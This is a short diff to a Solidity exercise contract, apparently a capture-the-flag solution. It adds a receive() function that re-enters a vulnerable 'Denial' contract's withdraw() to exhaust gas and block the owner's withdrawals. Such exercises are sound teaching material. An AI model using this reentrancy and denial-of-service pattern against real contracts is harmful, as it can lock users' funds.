@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
+    receive() external payable {
+      Denial(contractAddress).setWithdrawPartner(address(this));
+      Denial(contractAddress).withdraw();
+    }
+
     //Code me!
 }
